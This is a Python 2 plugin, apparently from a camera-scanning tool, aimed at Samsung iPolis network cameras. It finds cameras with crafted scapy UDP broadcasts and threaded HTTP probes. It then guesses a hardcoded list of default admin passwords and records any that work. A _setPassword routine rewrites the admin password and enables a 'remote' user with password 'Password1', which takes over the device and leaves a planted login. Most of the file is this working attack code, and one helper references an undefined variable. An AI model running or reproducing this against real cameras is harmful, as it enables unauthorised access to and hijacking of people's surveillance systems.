import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.basicConfig()
import sys, getopt
sys.path.append('../')
import threading
from scapy.all import *
from Camera import Camera
import Cameras as pluginTypes

class Samsung(pluginTypes.Cameras):
    def __init__(self):
        pluginTypes.Cameras.__init__(self)
        self.list_of_creds = [
                                        {'username':'admin', 'password':'4321'}, 
                                        {'username':'admin', 'password':'admin'}, 
                                        {'username':'admin', 'password':'0000000'}, 
                                        {'username':'admin', 'password':''}, 
                                        ]

    def _doSetup(self, settings):
        self.discovered_camera = None
        self.sniff_timout = 5 #scapy sniff timeout
        self.synflood_sleep_timer = 10

        
    def _doStream(self, ip, username=None, password=None):
        pass
    def _doDiscovery(self):
        #UDP Broadcast scan?
        if self.dip == '255.255.255.255':
            self.__doDiscoveryBroadcast()
            cameras = copy.deepcopy(self.found_cameras)
            self.found_cameras = [] #reset broadcast discovery values
            for camera in cameras:
                self._getDetails(camera.ip)
        else:
            #scanning for single ip or list in file
            for myip in self._getNextIP():
                #restrict num of threads or we run out of mem
                while threading.active_count() > self.threads:
                    if self.debug is not None:
                        print "Waiting for free threads. %s threads used." % threading.active_count() 
                    time.sleep(2)
                t1 = threading.Thread(target=self._getDetails, args=[str(myip),self.username, self.password ])
                t1.start()
            #Wait till all threads are complete because scans my still be running when we reach this point
            while threading.active_count() > 1:
                if self.debug:
                    print "Active threads " + str(threading.active_count())
                time.sleep(2)

    """
    Discover Samsung network cameras using broadcast udp packets. Only works on local LAN
    """
    def __doDiscoveryBroadcast(self):
        mac_broadcast = "ff:ff:ff:ff:ff:ff"
        t1 = threading.Thread(target=self.__doSniff)
        t1.start()
        
        #Construct scapy udp broadcast packets
        scapy_udp_packets = []
        scapy_udp_packets.append( Ether(dst=mac_broadcast,type=0x800)/IP(src=self.sip,dst=self.dip)/UDP(dport=7601,sport=1141)/Raw(load=str("01"+ ("0"*222)).decode('hex') ) ) 
        scapy_udp_packets.append( Ether(dst=mac_broadcast,type=0x800)/IP(src=self.sip,dst=self.dip)/UDP(dport=8101,sport=1142)/Raw(load=str(("0"*342)).decode('hex') ) )
        scapy_udp_packets.append( Ether(dst=mac_broadcast,type=0x800)/IP(src=self.sip,dst=self.dip)/UDP(dport=40001,sport=40000)/Raw(load=str("a4d1604abe1af8eb0100").decode('hex') ) )
        scapy_udp_packets.append( Ether(dst=mac_broadcast,type=0x800)/IP(src=self.sip,dst=self.dip)/UDP(dport=8404,sport=1137)/Raw(load=str("a003000100000000000000080004ffffffffffff").decode('hex') ) )
        scapy_udp_packets.append( Ether(dst=mac_broadcast,type=0x800)/IP(src=self.sip,dst=self.dip)/UDP(dport=7603,sport=1143)/Raw(load=str("01"+("0"*522)).decode('hex') ) )
        scapy_udp_packets.append( Ether(dst=mac_broadcast,type=0x800)/IP(src=self.sip,dst=self.dip)/UDP(dport=7701,sport=1144)/Raw(load=str("06"+("0"*666)).decode('hex') ) )
        #Send layer 2 scapy packets
        for packet in scapy_udp_packets:
            sendp( packet,iface=self.sif,  verbose=False)
        #Wait till scapy process sniffs authc creds. When global sniffed_camera is set then we can kill processes
        while (self.discovered_camera == None):
            time.sleep(2)
        if self.debug:
            print "Discovered Camera: IP " + self.discovered_camera .getlayer(IP).src + " MAC " + self._getScapyMac(self.discovered_camera )
            #str(self.discovered_camera .getlayer(UDP))
        self.found_cameras.append( Camera(ip=self.discovered_camera .getlayer(IP).src, mac=self._getScapyMac(self.discovered_camera ) ) )
    
    #Expect param scapy packet.
    #Return MAC address
    def _getScapyMac(self, pkt):
        return pkt.getlayer(Ether).src
    
    def _getMac(self, ip, username=None, password=None):
        url = 'http://' + ip + '/cgi-bin/basic.cgi?msubmenu=ip&action=view'
        page = self.getHTML(url, username, password, auth_method='digest')
        m = re.search('MAC:([a-f0-9:]+)', page.content, re.I)
        if m and m.group(1):
            return m.group(1)

    def __doSniff(self):
        print self.getClassName() + " entering sniffing mode"
        m_iface=self.sif
        source_port = 7701 #camera responds on this port
        
        def pktTCP(pkt):
            global discovered_camera
            if pkt.haslayer(UDP) and pkt.getlayer(UDP).sport == source_port and pkt.haslayer(Raw):
                self.discovered_camera = pkt
                if self.debug:
                    print str(pkt)
                    sport = pkt.getlayer(UDP).sport
                    print sport
                    
        sniff(iface=m_iface,prn=pktTCP, store=0, timeout=self.sniff_timout) # store=1 uses up all ram 

    #Return results and have a chance to format output
    def _doOutput(self):
        self.doDiscoveryBlockOutput()
        
    """
    Try to connect to IP address to detemine if webcam.
    """
    def _getDetails(self, ip, username=None, password=None):
        global found_cameras
        model = 'Locked'
        fullname = 'Locked'
        mac = 'Locked'
        description = 'Samsung'
        camera_state = self._isCamera(ip)
        
        if camera_state == 200: #unprotected camera
            model = self._getReleaseName(ip)
            fullname = self._getFullName(ip)
            mac = self._getMac(ip)
            username = 'BLANK'
            password = 'BLANK'
        elif camera_state == 401: #401 must mean authc required. Let's try to guess the creds.
            if self.debug:
                print 'Attempt to authenticate ' +ip
            if username is not None: #Did caller specify creds as param
                camera_state = self._isCamera(ip, username=username, password=password)
                if camera_state == 200:
                    model = self._getReleaseName(ip, username=username, password=password)
                    fullname = self._getFullName(ip, username=username, password=password)
                    mac = self._getMac(ip, username=username, password=password)
            #Did caller specify a password file using --pfile param?
            elif self.list_of_creds:
                if self.debug:
                    print self.list_of_creds
                for cred in self.list_of_creds:
                    camera_state = self._isCamera(ip, username=cred['username'], password=cred['password'])
                    if camera_state == 200:
                        model = self._getReleaseName(ip, username=cred['username'], password=cred['password'])
                        fullname = self._getFullName(ip, username=cred['username'], password=cred['password'])
                        mac = self._getMac(ip, username=cred['username'], password=cred['password'])
                        username = cred['username']
                        password = cred['password']
                        break
            #Can't crack creds so report as locked
        else: #Seems to not be a camera
            return
        self.found_cameras.append( Camera(ip=ip, model=model,  fullname=fullname, mac=mac, username=username, password=password, description=description) )
    
    def _getFirmwareVersion(self, ip, username=None, password=None):
        url = 'http://' + ip + '/cgi-bin/about.cgi?msubmenu=about&action=view2'
        page = self.getHTML(url, username, password, auth_method='digest')
        m = re.search('version:(.*)', page.content, re.I)
        if m and m.group(1):
            return m.group(1)
        
    def _getFullName(self, ip, username=None, password=None):
        url = 'http://' + ip + '/cgi-bin/about.cgi?msubmenu=about&action=view2'
        page = self.getHTML(url, username, password, auth_method='digest')
        m = re.search('description:(.*)', page.content, re.I)
        if m and m.group(1):
            return m.group(1)
        
    def _getReleaseName(self, ip, username=None, password=None):
        url = 'http://' + ip + '/cgi-bin/about.cgi?msubmenu=capability&action=view'
        page = self.getHTML(url, username, password, auth_method='digest')
        m = re.search('modelname:(.*)', page.content, re.I)
        if m and m.group(1):
            return m.group(1)
        
    """
    Try to determine if ip address is Samsung camera using web pages
    Return HTTP 200 if page existsl or return 401 if auth is required and realm matches. False if ip is not Arecont camera.
    """
    def _isCamera(self, ip, username=None, password=None):
        url = 'http://'+ip+'/home/monitoring.cgi'
        page = self.getHTML(url, username=username, password=password, auth_method='digest')
        if self.debug:
            print page
            if page is not None:
                print page.content
        if page is not None:
            if page.status_code == 200:
                m = re.search('(ipolis)', page.content, re.I)#Test for iPolis string in page
                if m and m.group(1):
                    return 200
                else:
                    return False
            elif page.status_code == 401:
                auth_header = page.headers.get('www-authenticate')
                m = re.search('realm=\"(iPolis)', auth_header)
                if m and m.group(1):
                    return 401
        else:
            return False
        
    def _isCameraLocked(self, ip):
        page = self._isCamera(ip)
        if code == 401:
            return True
        else:
            return False

    def _setPassword(self, ip, username=None, password=None, new_password=None):
        post_value = '%3CSetUser%3E%3CAdmin%3E%3CPassword%3E'+new_password+'%3C%2FPassword%3E%3C%2FAdmin%3E%3CUser%3E%3CEnabled%3E0%3C%2FEnabled%3E%3CName%3Euser1%3C%2FName%3E%3CPassword%3Euser1%3C%2FPassword%3E%3CUserRightProfile%3E0%3C%2FUserRightProfile%3E%3CUserRightAudioIn%3E0%3C%2FUserRightAudioIn%3E%3CUserRightAudioOut%3E0%3C%2FUserRightAudioOut%3E%3CUserRightRelay%3E0%3C%2FUserRightRelay%3E%3C%2FUser%3E%3CUser%3E%3CEnabled%3E0%3C%2FEnabled%3E%3CName%3Euser2%3C%2FName%3E%3CPassword%3Euser2%3C%2FPassword%3E%3CUserRightProfile%3E0%3C%2FUserRightProfile%3E%3CUserRightAudioIn%3E0%3C%2FUserRightAudioIn%3E%3CUserRightAudioOut%3E0%3C%2FUserRightAudioOut%3E%3CUserRightRelay%3E0%3C%2FUserRightRelay%3E%3C%2FUser%3E%3CUser%3E%3CEnabled%3E1%3C%2FEnabled%3E%3CName%3Eremote%3C%2FName%3E%3CPassword%3EPassword1%3C%2FPassword%3E%3CUserRightProfile%3E1%3C%2FUserRightProfile%3E%3CUserRightAudioIn%3E0%3C%2FUserRightAudioIn%3E%3CUserRightAudioOut%3E0%3C%2FUserRightAudioOut%3E%3CUserRightRelay%3E0%3C%2FUserRightRelay%3E%3C%2FUser%3E%3CGuest%3E%3CEnabled%3E0%3C%2FEnabled%3E%3CUserRightProfile%3E0%3C%2FUserRightProfile%3E%3C%2FGuest%3E%3C%2FSetUser%3E'
        url = 'http://' + ip + '/cgi-bin/stw.cgi'
        page = self.postHTML(url, username, password, auth_method='digest',body=post_value)
